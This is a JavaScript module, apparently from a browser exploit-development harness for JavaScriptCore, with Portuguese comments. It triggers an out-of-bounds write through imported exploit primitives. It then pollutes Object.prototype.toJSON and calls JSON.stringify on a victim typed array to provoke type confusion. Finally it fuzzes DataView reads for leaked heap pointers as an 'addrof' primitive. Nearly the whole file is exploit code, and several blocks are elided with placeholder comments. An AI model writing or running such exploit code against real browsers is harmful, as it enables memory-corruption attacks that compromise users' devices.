// js/script3/testArrayBufferVictimCrash.mjs (v68_InspectPromiseRobustly)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_write_absolute,
    clearOOBEnvironment,
    getStableConfusedArrayBuffer
} from '../core_exploit.mjs';
import { JSC_OFFSETS } from '../config.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V68_IPR = "OriginalHeisenbug_TypedArrayAddrof_v68_InspectPromiseRobustly";

// Variáveis globais/módulo
let captured_inspection_for_PromiseAB_v68 = null;
let captured_fuzz_for_NormalDV_v68 = null;

let leak_target_confused_ab_v68 = null;
let leak_target_normal_dv_v68 = null;
let victim_typed_array_ref_v68 = null;
let probe_call_count_v68 = 0;
let all_probe_interaction_details_v68 = [];
let first_call_details_object_ref_v68 = null;

const VICTIM_BUFFER_SIZE = 256;
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET = 0x7C;
const OOB_WRITE_VALUE = 0xFFFFFFFF;
const PROBE_CALL_LIMIT_V68 = 10;
const FUZZ_OFFSETS_V68 = [0x00, 0x08, 0x10, 0x18, 0x20, 0x28, 0x30, 0x38];

function toJSON_TA_Probe_InspectPromiseRobustly_v68() {
    probe_call_count_v68++;
    const call_num = probe_call_count_v68;
    let current_call_details = {
        call_number: call_num,
        probe_variant: FNAME_MODULE_TYPEDARRAY_ADDROF_V68_IPR,
        this_type: Object.prototype.toString.call(this),
        this_is_victim: (this === victim_typed_array_ref_v68),
        this_is_C1: (this === first_call_details_object_ref_v68 && first_call_details_object_ref_v68 !== null),
        this_is_ConfusedAB: (this === leak_target_confused_ab_v68 && leak_target_confused_ab_v68 !== null),
        this_is_NormalDV: (this === leak_target_normal_dv_v68 && leak_target_normal_dv_v68 !== null),
        inspection_capture_info: null, // Para Promise ou AB fallback
        fuzz_capture_info: null, // Para NormalDV
        error_in_probe: null
    };
    logS3(`[${current_call_details.probe_variant}] Call #${call_num}. Type: ${current_call_details.this_type}. IsVictim? ${current_call_details.this_is_victim}. IsC1? ${current_call_details.this_is_C1}. IsConfusedAB? ${current_call_details.this_is_ConfusedAB}. IsNormalDV? ${current_call_details.this_is_NormalDV}`, "leak");

    try {
        if (call_num > PROBE_CALL_LIMIT_V68) { all_probe_interaction_details_v68.push({...current_call_details}); return { recursion_stopped_v68: true, call: call_num }; }

        if (call_num === 1 && current_call_details.this_is_victim) {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Victim. Creating C1_details w/ payloads.`, "info");
            first_call_details_object_ref_v68 = current_call_details;
            current_call_details.payload_ConfusedAB = leak_target_confused_ab_v68;
            current_call_details.payload_NormalDV = leak_target_normal_dv_v68;
            all_probe_interaction_details_v68.push({...current_call_details});
            return current_call_details;
        }
        else if (current_call_details.this_is_ConfusedAB && current_call_details.this_type === '[object Promise]') {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' IS ConfusedAB AND TYPE IS [object Promise]! Robustly Inspecting...`, "critical");
            let inspection_data = { type: "[object Promise]", keys: [], enumerable_props: {}, then_type: "N/A", catch_type: "N/A", finally_type: "N/A", error: null };
            try {
                inspection_data.keys = Object.keys(this); // Chaves enumeráveis próprias
                for (const key of inspection_data.keys) {
                    try { inspection_data.enumerable_props[key] = String(this[key]).substring(0,128); } catch(e_prop) { inspection_data.enumerable_props[key] = `Error reading: ${e_prop.message}`; }
                }
                if (typeof this.then === 'function') inspection_data.then_type = 'function'; else inspection_data.then_type = typeof this.then;
                if (typeof this.catch === 'function') inspection_data.catch_type = 'function'; else inspection_data.catch_type = typeof this.catch;
                if (typeof this.finally === 'function') inspection_data.finally_type = 'function'; else inspection_data.finally_type = typeof this.finally;
                current_call_details.inspection_capture_info = `Inspected ConfusedAB (as Promise). Keys: ${inspection_data.keys.join(',')}. Then type: ${inspection_data.then_type}`;
                logS3(`[${current_call_details.probe_variant}] ${current_call_details.inspection_capture_info}`, "vuln");
            } catch (e_inspect) {
                logS3(`[${current_call_details.probe_variant}] Error inspecting Promise: ${e_inspect.message}`, "error");
                inspection_data.error = e_inspect.message;
                current_call_details.inspection_capture_info = `Error inspecting Promise: ${e_inspect.message}`;
            }
            captured_inspection_for_PromiseAB_v68 = inspection_data; // Captura para canal lateral
            all_probe_interaction_details_v68.push({...current_call_details});
            return { marker_promise_inspected_v68: true, call_num_processed: call_num, observed_type: current_call_details.this_type };
        }
        else if (current_call_details.this_is_ConfusedAB && current_call_details.this_type === '[object ArrayBuffer]') {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' IS ConfusedAB (as ArrayBuffer). Logging and returning marker. (No fuzz for AB in v68, focus on Promise state).`, "warn");
            current_call_details.inspection_capture_info = "ConfusedAB seen as ArrayBuffer. Fallback.";
            captured_inspection_for_PromiseAB_v68 = { type_is_arraybuffer: true, note: "Fallback path, Promise confusion did not manifest here." };
            all_probe_interaction_details_v68.push({...current_call_details});
            return { marker_confused_ab_as_ab_v68: true, call_num_processed: call_num };
        }
        else if (current_call_details.this_is_NormalDV && current_call_details.this_type === '[object DataView]') {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' IS NormalDV! Fuzzing for control...`, "info");
            let fuzzed_reads = [];
            try { /* ... (lógica de fuzzing para NormalDV igual à v64, logando cada leitura) ... */
                let view = this; for (const offset of FUZZ_OFFSETS_V68) { let low=0,high=0,ptr_str="N/A",dbl=NaN,err_msg=null; if(view.byteLength<(offset+8)){err_msg="OOB";}else{low=view.getUint32(offset,true);high=view.getUint32(offset+4,true);ptr_str=new AdvancedInt64(low,high).toString(true);let tb=new ArrayBuffer(8);(new Uint32Array(tb))[0]=low;(new Uint32Array(tb))[1]=high;dbl=(new Float64Array(tb))[0];} fuzzed_reads.push({offset:toHex(offset),low:toHex(low),high:toHex(high),int64:ptr_str,dbl:dbl,error:err_msg}); logS3(`    NormalDV Fuzz@${toHex(offset)}: L=${toHex(low)} H=${toHex(high)} I64=${ptr_str} D=${dbl}${err_msg?' E:'+err_msg:''}`,"dev_verbose");}
            } catch (e) { current_call_details.error_in_probe = e.message; }
            captured_fuzz_for_NormalDV_v68 = fuzzed_reads;
            current_call_details.fuzz_capture_info = `NormalDV Fuzz captured ${fuzzed_reads.length} reads.`;
            logS3(`[${current_call_details.probe_variant}] ${current_call_details.fuzz_capture_info}`, "info");
            all_probe_interaction_details_v68.push({...current_call_details});
            return { marker_normal_dv_fuzz_done_v68: true, call_num_processed: call_num };
        }
        else if (current_call_details.this_is_C1 && current_call_details.this_type === '[object Object]') { /* ... C1 re-entry ... */ }
        else { /* ... unexpected ... */ }

        all_probe_interaction_details_v68.push({...current_call_details});
        return `ProcessedCall${call_num}_Type${current_call_details.this_type.replace(/[^a-zA-Z0-9]/g, '')}`;
    } catch (e_probe) { /* ... (tratamento de erro geral da sonda) ... */ }
}

export async function executeTypedArrayVictimAddrofTest_InspectPromiseRobustly() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V68_IPR}.triggerAndLog`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Heisenbug (InspectPromiseRobustly) & Addrof ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V68_IPR} Init...`;

    captured_inspection_for_PromiseAB_v68 = null;
    captured_fuzz_for_NormalDV_v68 = null;
    probe_call_count_v68 = 0;
    all_probe_interaction_details_v68 = [];
    victim_typed_array_ref_v68 = null;
    first_call_details_object_ref_v68 = null;

    let tempOriginalToJSON_getter = Object.getOwnPropertyDescriptor(Object.prototype, 'toJSON');
    logS3(`[${FNAME_CURRENT_TEST}] Tentando obter Confused ArrayBuffer do core_exploit...`, "info");
    leak_target_confused_ab_v68 = getStableConfusedArrayBuffer();
    if (tempOriginalToJSON_getter) Object.defineProperty(Object.prototype, 'toJSON', tempOriginalToJSON_getter); else delete Object.prototype.toJSON;

    let initial_confused_ab_type = "null_or_failed_to_get";
    if (leak_target_confused_ab_v68 !== null && leak_target_confused_ab_v68 !== undefined) {
        initial_confused_ab_type = Object.prototype.toString.call(leak_target_confused_ab_v68);
        logS3(`[${FNAME_CURRENT_TEST}] Confused AB (leak_target_confused_ab_v68) RETORNADO pelo getter. Tipo inicial reportado: ${initial_confused_ab_type}`, "debug");
    } else {
        logS3(`[${FNAME_CURRENT_TEST}] getStableConfusedArrayBuffer RETORNOU null/undefined. Usando fallback para ConfusedAB.`, "warn");
        leak_target_confused_ab_v68 = new ArrayBuffer(0x10); // Fallback se falhar
    }
    leak_target_normal_dv_v68 = new DataView(new ArrayBuffer(0x80));

    let errorCapturedMain = null, rawStringifyOutput = "N/A", stringifyOutput_parsed = null;
    let collected_probe_details_for_return = [];
    let addrof_A_result = { success: false, msg: "Addrof ConfusedAB/Promise: Default (v68)" };
    let addrof_B_result = { success: false, msg: "Addrof NormalDV: Default (v68)" };
    let pollutionApplied = false, originalToJSONDescriptor = null;

    try {
        await triggerOOB_primitive({ force_reinit: true });
        oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET, OOB_WRITE_VALUE, 4);
        logS3(`  Critical OOB write for main test.`, "info", FNAME_CURRENT_TEST);
        await PAUSE_S3(100);
        victim_typed_array_ref_v68 = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE));

        const ppKey = 'toJSON';
        originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
        try {
            Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_InspectPromiseRobustly_v68, writable: true, configurable: true, enumerable: false });
            pollutionApplied = true;
            logS3(`  toJSON polluted. Calling JSON.stringify(victim_typed_array_ref_v68)...`, "info", FNAME_CURRENT_TEST);
            rawStringifyOutput = JSON.stringify(victim_typed_array_ref_v68);
            logS3(`  JSON.stringify completed. Raw Output: ${rawStringifyOutput}`, "info");
            try{ stringifyOutput_parsed = JSON.parse(rawStringifyOutput); } catch(e){ /* ... */ }

            logS3("STEP 3: Analyzing captured data (v68)...", "warn", FNAME_CURRENT_TEST);
            let heisenbugIndication = false;

            if (captured_inspection_for_PromiseAB_v68) {
                heisenbugIndication = true;
                const inspection = captured_inspection_for_PromiseAB_v68;
                logS3(`  V68_ANALYSIS: Captured info for ConfusedAB (as Promise): Type=${inspection.type}, Keys=[${(inspection.keys || []).join(', ')}], Then=${inspection.then_type}, Error=${inspection.error || 'N/A'}`, "good");
                if (inspection.type_is_arraybuffer) {
                    addrof_A_result.msg = "V68 ConfusedAB remained ArrayBuffer in probe. Inspection was fallback.";
                } else {
                    addrof_A_result.msg = `V68 ConfusedAB became ${inspection.type}. Keys: ${(inspection.keys || []).join(',')}.`;
                    // Aqui poderíamos adicionar lógica se alguma propriedade inspecionada for um ponteiro, mas é improvável.
                }
            } else if (!addrof_A_result.success) {
                addrof_A_result.msg = "V68 No inspection data captured for ConfusedAB.";
            }

            const process_fuzz = (fuzz_data, adr_res, typeName) => { /* ... (mesma lógica da v64 para processar NormalDV) ... */
                if(fuzz_data && Array.isArray(fuzz_data)){ if(!heisenbugIndication && fuzz_data.length>0) heisenbugIndication=true; logS3(`  V68_ANALYSIS: Processing ${fuzz_data.length} fuzz reads for ${typeName}.`,"info"); for(const r of fuzz_data){ if(r.error)continue; const hV=parseInt(r.high,16),lV=parseInt(r.low,16); let isPtr=false; if(JSC_OFFSETS.JSValue?.HEAP_POINTER_TAG_HIGH!==undefined){isPtr=(hV===JSC_OFFSETS.JSValue.HEAP_POINTER_TAG_HIGH&&(lV&JSC_OFFSETS.JSValue.TAG_MASK)===JSC_OFFSETS.JSValue.CELL_TAG);} if(!isPtr&&(hV>0||lV>0x10000)&&(hV<0x000F0000)&&((lV&0x7)===0)){isPtr=true;} if(isPtr&&!(hV===0&&lV===0)){adr_res.success=true;adr_res.msg=`V68 SUCCESS (${typeName}): Ptr ${r.int64} @${r.offset}`;logS3(` !!!! V68 POINTER for ${typeName} @${r.offset}: ${r.int64} !!!!`,"vuln");break;}} if(!adr_res.success){adr_res.msg=`V68 Fuzz for ${typeName} no ptr. First: ${fuzz_data[0]?.int64||'N/A'}`;}} else if(!adr_res.success){adr_res.msg=`V68 No fuzz data for ${typeName}.`;}
            };
            process_fuzz(captured_fuzz_for_NormalDV_v68, addrof_B_result, "NormalDV (Control)");

            if(!heisenbugIndication && first_call_details_object_ref_v68){ /* ... */ }
            // ... (lógica de título do documento) ...
            if(addrof_A_result.success||addrof_B_result.success){document.title=`${FNAME_MODULE_TYPEDARRAY_ADDROF_V68_IPR}: Addr SUCCESS!`;}
            else if(heisenbugIndication){document.title=`${FNAME_MODULE_TYPEDARRAY_ADDROF_V68_IPR}: Heisenbug OK, Addr Fail`;}
            else{document.title=`${FNAME_MODULE_TYPEDARRAY_ADDROF_V68_IPR}: No Heisenbug?`;}


        } catch (e) { errorCapturedMain = e; /* ... */ } finally { /* ... */ }
    } catch (e) { errorCapturedMain = e; /* ... */ }
    finally {
        // CORREÇÃO PARA O RUNNER: Copiar antes de limpar
        if (all_probe_interaction_details_v68 && Array.isArray(all_probe_interaction_details_v68)) {
            collected_probe_details_for_return = all_probe_interaction_details_v68.map(d => ({ ...d }));
        } else {
            collected_probe_details_for_return = [];
        }
        clearOOBEnvironment({force_clear_even_if_not_setup: true});
        // ... (logs e limpeza de globais) ...
        logS3(`--- ${FNAME_CURRENT_TEST} Completed ---`, "test", FNAME_CURRENT_TEST);
        logS3(`Total probe calls: ${probe_call_count_v68}`, "info", FNAME_CURRENT_TEST);
        logS3(`Addrof A (ConfusedAB/Promise): Success=${addrof_A_result.success}, Msg='${addrof_A_result.msg}'`, addrof_A_result.success ? "good" : "warn", FNAME_CURRENT_TEST);
        logS3(`Addrof B (NormalDV): Success=${addrof_B_result.success}, Msg='${addrof_B_result.msg}'`, addrof_B_result.success ? "good" : "warn", FNAME_CURRENT_TEST);
        // Limpeza de globais da v68
        captured_inspection_for_PromiseAB_v68 = null; captured_fuzz_for_NormalDV_v68 = null; leak_target_confused_ab_v68 = null; leak_target_normal_dv_v68 = null; victim_typed_array_ref_v68 = null; probe_call_count_v68 = 0; all_probe_interaction_details_v68 = []; first_call_details_object_ref_v68 = null;
    }
    return { /* ... objeto de resultado com collected_probe_details_for_return ... */ };
};
